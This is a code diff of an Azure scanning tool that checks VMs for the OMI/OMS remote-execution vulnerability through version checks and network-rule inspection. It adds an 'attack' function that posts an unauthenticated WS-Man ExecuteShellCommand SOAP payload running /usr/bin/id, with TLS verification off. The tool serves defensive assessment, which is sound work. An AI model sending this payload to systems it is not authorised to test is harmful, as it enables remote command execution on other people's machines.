@@ -3,15 +3,15 @@ import logging
 import re
 import argparse
 import traceback
+import requests
+import json
+from packaging.version import parse as parse_version
 from typing import Dict, List, Optional, Any
-from packaging import version
 from azure.identity import AzureCliCredential,InteractiveBrowserCredential
 from azure.mgmt.resource import SubscriptionClient, ResourceManagementClient
 from azure.mgmt.compute import ComputeManagementClient
 from azure.mgmt.network import NetworkManagementClient
-import pandas as pd
-sys.path.append('.')
-from omicheck import OmiCheck
+
 
 LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 logger = logging.getLogger("omigood")
@@ -106,7 +106,8 @@ def parse_rules(rules: List[Dict[str, Any]], ports: List[int]) -> bool:
             continue
         if r.get("protocol") not in allowed_protocols:
             continue
-        if not (dest_port := r.get("dest_port")):
+        dest_port = r.get("dest_port")
+        if not dest_port:
             continue
         for p in dest_port.split(","):
             if p == "*" or p == "0-65535":
@@ -342,6 +343,39 @@ def check_vm_netsec(
         vm_interfaces.append(vm_interface)
     return vm_interfaces
 
+def omi_check(proto: str, url: str, port: int) -> bool:
+
+        uri = f"{proto}://{url}:{port}/wsman"
+
+        body = """<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"
+    xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\"
+    xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">
+<s:Header>
+ <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
+ <w:SelectorSet>
+     <w:Selector Name=\"__cimnamespace\">root/scx</w:Selector>
+  </w:SelectorSet>
+</s:Header>
+<s:Body>
+  <p:ExecuteShellCommand_INPUT xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">
+     <p:command>/usr/bin/id</p:command>
+     <p:timeout>0</p:timeout>
+  </p:ExecuteShellCommand_INPUT>
+</s:Body>
+</s:Envelope>
+"""
+        headers = {
+            'Content-type': 'application/soap+xml;charset=UTF-8',
+            'User-Agent': 'Microsoft WinRM Client'
+        }
+
+        response = requests.post(uri, data=body, headers=headers, verify=False)
+
+        if response.status_code == 200:
+            return True
+        elif response.status_code == 404:
+            return False
+
 
 def attack_vm(vm_name: str, vm_interfaces: List[Dict[str, Any]]) -> bool:
     for vm_interface in vm_interfaces:
@@ -354,8 +388,7 @@ def attack_vm(vm_name: str, vm_interfaces: List[Dict[str, Any]]) -> bool:
                 logger.info(
                     f"Trying to attack {vm_name} on IP {target_ip} on {proto}/{port}"
                 )
-                check = OmiCheck(target_ip, str(port))
-                if check.check():
+                if omi_check(proto, target_ip, port):
                     return True
     return False
 
@@ -412,7 +445,7 @@ def main():
         type=str,
     )
     parser.add_argument(
-        "-o", "--output", help="[OPTIONAL] CSV output file with results.", type=str
+        "-o", "--output", required=True, help="JSON output file with results.", type=str
     )
 
     try:
@@ -523,8 +556,8 @@ def main():
                     }
 
                     if vm_oms_version:
-                        oms_version = version.parse(vm_oms_version)
-                        if oms_version < version.parse(MIN_PATCHED_OMS_VERSION):
+                        oms_version = parse_version(vm_oms_version)
+                        if oms_version < parse_version(MIN_PATCHED_OMS_VERSION):
                                 logger.info(f"VM {r.name} has a VULNERABLE version of OMS!")
                                 vm_item["check_oms_vulnerable"] = "YES"
                         else:
@@ -560,9 +593,9 @@ def main():
                                     f"Cannot determine OMI version number: {message}"
                                 )
                             else:
-                                omi_version = version.parse(m.group(1))
+                                omi_version = parse_version(m.group(1))
                                 vm_item["omi_version"] = m.group(1)
-                                if omi_version < version.parse(MIN_PATCHED_OMI_VERSION):
+                                if omi_version < parse_version(MIN_PATCHED_OMI_VERSION):
                                     logger.info(f"VM {r.name} is VULNERABLE")
                                     vm_item["check_version_vulnerable"] = "YES"
                                     vm_item["bash_script_output"] = message
@@ -585,22 +618,25 @@ def main():
                                 else:
                                     vm_item["check_omi_listening_on_socket"] = "UNKNOWN"
                         except Exception as e:
-                            logger.warning(f'Cannot run script on VM, continuing. Exception: {str(e)}')
+                            logger.warning(f'Cannot run script on VM {r.name}, continuing. Exception: {str(e)}')
 
                     if args.attack:
-                        vulnerable = attack_vm(r.name, vm_interfaces)
-                        if vulnerable:
-                            logger.info("Attack was successful: machine is vulnerable!")
-                            vm_item["check_attack_successful"] = "YES"
-                        else:
-                            logger.info("Attack was unsuccessful")
-                            vm_item["check_attack_successful"] = "NO"
+                        try:
+                            vulnerable = attack_vm(r.name, vm_interfaces)
+                            if vulnerable:
+                                logger.info("Attack was successful: machine is vulnerable!")
+                                vm_item["check_attack_successful"] = "YES"
+                            else:
+                                logger.info("Attack was unsuccessful")
+                                vm_item["check_attack_successful"] = "NO"
+                        except Exception as e:
+                            logger.warning(f'Attack VM failed on VM {r.name}, continuing. Exception: {str(e)}')
 
                     vm_list.append(vm_item)
         if args.output:
-            vm_df = pd.DataFrame(vm_list)
-            vm_df.to_json(args.output)
-
+            with open(args.output, 'w') as fd:
+                json.dump(vm_list, fd)
+ 
     except Exception as e:
         logger.error(
             f"Got Exception, exiting!\nException: {str(e)}\n{traceback.format_exc()}"
